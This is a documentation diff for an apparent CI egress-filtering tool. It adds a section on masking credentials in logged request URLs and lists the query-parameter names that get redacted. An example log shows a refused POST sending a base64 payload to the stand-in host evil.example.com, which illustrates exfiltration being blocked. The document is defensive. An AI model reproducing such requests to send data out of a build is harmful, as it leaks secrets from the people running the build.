@@ -117,8 +117,8 @@ Paste that allowlist into the setup step and switch the mode:
 
 Each rule names the methods it permits, so this one lets npm fetch packages without letting it
 publish any: a `POST` to the same host is refused, as is every host not listed. Whatever is refused
-is listed under **Blocked Hosts** with the reason, and **Communication details** names the full URL
-of every request, allowed or refused:
+is listed under **Blocked Hosts** with the reason, and **Communication details** names the URL of
+every request, allowed or refused:
 
 <img src="assets/report-inspect-restrict-mode.png" alt="Outbound Traffic Report - restrict mode" width="556">
 
@@ -342,7 +342,7 @@ write instead.
 | --------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------- |
 | A rule can say                                | `GET\|HEAD https://registry.npmjs.org/**`                   | `registry.npmjs.org:443`                                |
 | Allow a fetch, refuse a publish, same host    | ✅                                                          | -                                                       |
-| The report shows                              | Every request with its full URL                             | Host and port                                           |
+| The report shows                              | Every request with its URL                                  | Host and port                                           |
 | Domain fronting (allowed SNI, another `Host`) | Refused, the real `Host` is what rules match                | Not visible                                             |
 | The build's TLS                               | Terminated and re-signed with a CA generated for that build | Untouched                                               |
 | Certificate pinning, or the JVM's own store   | -                                                           | ✅                                                      |
@@ -514,6 +514,30 @@ Naming the service name in an `allowed_*` rule also clears the row, but it is th
 it reads as permission to reach something that nothing can connect to, and the record still does not
 resolve.
 
+### Credentials in a URL
+
+**Communication details** and the job log print the URL of every request, so a credential written
+into a query string reaches everyone who can read the run. GitHub masks the values it knows as
+workflow secrets, which leaves the ones it does not: a presigned URL's signature, a token minted
+during the build, or a secret whose URL-encoded form no longer matches what was registered.
+
+The value of a query parameter named `access_token`, `api_key`, `apikey`, `auth`, `code`, `key`,
+`password`, `secret`, `sig`, `signature`, `token`, `x-amz-security-token`, `x-amz-signature` or
+`x-goog-signature` is therefore replaced, whatever its case:
+
+```
+✅ 00:04.212: GET https://cdn.example.com/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600 -> 200 (4.1MB)
+🚫 00:05.003: POST https://evil.example.com/?d=BASE64PAYLOAD -> not-allowed
+```
+
+Everything else is printed as it was sent, parameter names included, so a refused request still says
+what it tried to send. Two things this does not cover: a credential in the path, which
+`allowed_url_rules` is written against and so cannot be hidden, and one in a parameter this list does
+not name. The [traffic artifact](#traffic-artifact) keeps every value verbatim.
+
+An `allowed_url_rules` block suggested by an audit run never carries a query at all: rules match on
+the path, and a recorded query is as likely to hold a one-off token as anything reusable.
+
 ### Traffic artifact
 
 `upload_traffic_artifact: true` uploads the same timeline as a `traffic.json` inside an artifact
@@ -533,7 +557,7 @@ asked for. `universal` never sees a method or a URL, so this input only does any
 | `port`        |        | absent for `dns`, which connects to nothing                      |
 | `queryType`   |        | the record asked for; `discovery` rows and refused service names |
 | `method`      |        | `http` and `https` only                                          |
-| `url`         |        | `http` and `https` only                                          |
+| `url`         |        | `http` and `https` only; verbatim, unlike the summary's          |
 | `status`      |        | only when something answered                                     |
 | `bytes`       |        | absent for a refusal and for `dns`                               |
 | `reason`      |        | only when `action` is `block`                                    |
